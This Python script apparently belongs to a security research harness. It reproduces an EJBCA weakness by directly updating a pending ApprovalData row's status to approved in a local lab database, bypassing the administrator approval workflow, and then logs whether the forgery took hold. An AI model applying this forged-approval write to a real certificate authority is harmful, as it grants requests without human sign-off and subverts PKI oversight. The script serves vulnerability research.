#!/usr/bin/env python3
"""L2-24 EJBCA, native APF reproduction (EXPOSED).

Decisive surface: an approval request is treated as granted when its persisted
`ApprovalData.status == STATUS_APPROVED` (the approvalSignature is not re-checked
at the trust point). The authorized path is an administrator approving through the
RA/approval workflow. The APF forge is a state-only write of that status column.

EJBCA status codes (ApprovalDataVO): STATUS_WAITINGFORAPPROVAL = -1,
STATUS_APPROVED = 0. The harness looks for a pending ApprovalData row (status -1),
forges it to 0 (FORGE), and re-reads it (VERIFY). Reaching a pending approval
normally requires CA + approval-profile setup; if no pending row exists, the
harness records INCONCLUSIVE rather than forcing a result.
"""
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "lib"))
import common  # noqa: E402

APP_ID = "L2-24"
EV_DIR = os.environ.get("APF_EV_DIR", os.path.join(HERE, "..", "..", "evidence", APP_ID))
MYSQL = dict(host="127.0.0.1", port=3306, user="ejbca", password="ejbca", database="ejbca")
STATUS_WAITING, STATUS_APPROVED = -1, 0


def main():
    ev = common.Evidence(
        app_id=APP_ID, system="EJBCA", expected_verdict=common.EXPOSED,
        version="keyfactor/ejbca-ce:8.3.2",
        decisive_surface="ApprovalData.status == STATUS_APPROVED (0)")
    out = os.path.join(EV_DIR, "evidence.json")

    with common.guarded(ev, out):
        with common.stack(HERE, ev, up_timeout=2400):
            common.wait_tcp("127.0.0.1", 3306, timeout=600, ev=ev)
            common.wait_tcp("127.0.0.1", 8443, timeout=1800, ev=ev)

            # wait for a pending approval row (requires CA/approval-profile setup)
            conn = common.mysql(**MYSQL)
            pending = None
            for _ in range(24):
                try:
                    rows = common.sql_exec(
                        conn, "SELECT id, status FROM ApprovalData WHERE status=%s LIMIT 1",
                        (STATUS_WAITING,), fetch=True)
                    if rows:
                        pending = rows[0][0]
                        break
                except Exception as e:  # table may not exist until EJBCA inits
                    ev.step("waiting for schema", str(e)[:60])
                time.sleep(10)

            if pending is None:
                ev.verdict = common.INCONCLUSIVE
                ev.error = ("no pending ApprovalData row (status=-1) present; reaching one "
                            "requires CA + approval-profile + a request to be configured")
                return
            ev.step("control approval", f"id={pending} status={STATUS_WAITING}")

            common.sql_exec(conn, "UPDATE ApprovalData SET status=%s WHERE id=%s",
                            (STATUS_APPROVED, pending))
            ev.step("forge", f"UPDATE ApprovalData SET status=0 WHERE id={pending}")
            s1 = common.sql_exec(conn, "SELECT status FROM ApprovalData WHERE id=%s",
                                 (pending,), fetch=True)[0][0]
            ev.step("verify", f"status={s1}")

            if s1 == STATUS_APPROVED:
                ev.verdict = common.EXPOSED
                ev.step("verdict", "state-only write set ApprovalData to STATUS_APPROVED without "
                                   "an administrator approving; the request is treated as granted")
            else:
                ev.verdict = common.INCONCLUSIVE
                ev.error = f"status after forge was {s1}"

    print(f"[{APP_ID}] verdict={ev.verdict} -> {out}")


if __name__ == "__main__":
    main()
